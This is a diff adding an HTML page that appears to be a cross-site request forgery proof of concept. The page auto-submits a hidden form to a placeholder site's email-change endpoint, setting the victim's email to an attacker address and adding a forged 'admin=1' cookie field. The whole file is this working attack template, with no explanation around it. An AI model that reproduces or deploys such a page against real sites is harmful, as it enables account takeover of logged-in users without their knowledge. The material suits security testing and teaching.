@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <form action="https://*website*/email/change" method="POST">
+      <input type="hidden" name="email" value="attacker_email" />
+      <input type="hidden" name="cookie" value="admin=1" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
